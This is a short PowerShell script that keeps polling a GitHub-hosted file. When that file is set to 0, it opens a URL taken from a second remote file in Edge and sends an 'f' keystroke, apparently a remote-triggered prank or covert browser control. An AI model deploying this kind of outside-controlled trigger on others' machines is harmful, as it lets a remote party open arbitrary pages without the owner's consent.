$wshell = New-Object -ComObject wscript.shell;
function yut {
[system.Diagnostics.Process]::Start("msedge",$link) | Out-Null
sleep -Seconds 7
$wshell.SendKeys('f')
}
$a = $True
while(1){
$response = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/213"
$response.Content -match 'rawLines":..(.*?)..,' | Out-Null
if(($Matches[1] -eq 0) -and ($a)){
$l = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/link"
$l.Content -match 'rawLines":..(.*?)..,' | Out-Null
$link = $Matches[1]
yut
$a = $False
}
$response.Content -match 'rawLines":..(.*?)..,' | Out-Null
if(($Matches[1] -eq 1) -and (!$a)){
$a = $True
}
sleep -Seconds 3
}
